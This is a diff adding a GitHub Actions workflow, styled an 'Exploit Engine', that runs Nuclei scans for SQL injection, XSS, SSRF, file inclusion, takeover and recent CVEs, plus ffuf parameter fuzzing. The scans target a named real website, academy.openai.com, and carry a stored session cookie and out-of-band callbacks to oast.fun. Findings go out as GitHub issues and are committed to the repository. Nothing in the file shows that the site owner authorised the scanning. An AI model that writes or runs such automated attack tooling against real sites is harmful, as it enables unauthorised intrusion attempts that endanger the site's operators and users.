@@ -1,0 +1,100 @@
+name: "Elite Target Exploit Engine — 2026 MAX VERSION"
+
+on:
+  workflow_dispatch: # Focus all power on the target URL manually
+
+permissions:
+  contents: write
+  issues: write
+
+env:
+  TARGET_URL: "https://academy.openai.com/?amp=test"
+  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
+  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # 10 Parallel Sessions covering all 2025-2026 CVEs and Vulnerability Classes
+        vuln: [sqli, xss, ssti, ssrf, idor, lfi, takeover, exposure, cve2025, cve2026]
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Install Arsenal (Nuclei & FFUF)
+        run: |
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install github.com/ffuf/ffuf/v2@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+
+      - name: 🛠 Setup 2026 CVE Templates
+        run: |
+          nuclei -ut
+          # Create a custom wordlist for parameter fuzzing
+          echo "amp" > /tmp/params.txt
+          echo "redirect" >> /tmp/params.txt
+          echo "callback" >> /tmp/params.txt
+          echo "url" >> /tmp/params.txt
+          echo "id" >> /tmp/params.txt
+
+      - name: 🎯 FFUF Deep Parameter Fuzzing
+        # This checks if other hidden parameters on the academy page are vulnerable
+        run: |
+          ffuf -u "https://academy.openai.com/?FUZZ=test" \
+            -w /tmp/params.txt \
+            -H "Cookie: $AUTH_COOKIE" \
+            -mc 200,302 -o /tmp/ffuf_results.json || true
+
+      - name: ☢️ Nuclei High-Intensity Scan
+        run: |
+          nuclei -u "$TARGET_URL" \
+            -tags ${{ matrix.vuln }} \
+            -severity critical,high,medium,low \
+            -header "Cookie: $AUTH_COOKIE" \
+            -header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBounty-Scanner" \
+            -interactsh-server oast.fun \
+            -rate-limit 100 \
+            -stats \
+            -o /tmp/nuclei_${{ matrix.vuln }}.txt
+
+      - name: 🚨 Instant Alert if Bug Caught
+        if: always()
+        run: |
+          if [ -s /tmp/nuclei_${{ matrix.vuln }}.txt ]; then
+            REPORT=$(cat /tmp/nuclei_${{ matrix.vuln }}.txt | head -c 1000)
+            curl -X POST \
+              -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Content-Type: application/json" \
+              https://api.github.com/repos/${{ github.repository }}/issues \
+              -d "{\"title\":\"🚨 BUG DETECTED: ${{ matrix.vuln }}\",\"body\":\"Target: $TARGET_URL\n\n\`\`\`\n$REPORT\n\`\`\`\"}"
+          fi
+
+      - name: 💾 Final Intel Persistence (Sync & Save)
+        if: always()
+        run: |
+          git config --local user.email "bot@hacker.ai"
+          git config --local user.name "Exploit-Bot"
+          
+          # Retry loop for parallel Git pushes
+          for i in {1..15}; do
+            git pull origin main --rebase
+            mkdir -p confirmed_findings
+            
+            # Copy findings from /tmp to workspace
+            [ -f /tmp/nuclei_${{ matrix.vuln }}.txt ] && cp /tmp/nuclei_${{ matrix.vuln }}.txt confirmed_findings/
+            [ -f /tmp/ffuf_results.json ] && cp /tmp/ffuf_results.json confirmed_findings/
+            
+            git add confirmed_findings/
+            if git commit -m "Confirmed Intel: ${{ matrix.vuln }} | $(date)"; then
+              git push origin main && break
+            else
+              echo "No new findings for this worker."
+              break
+            fi
+            sleep $(( (RANDOM % 20) + 10 ))
+          done
+          
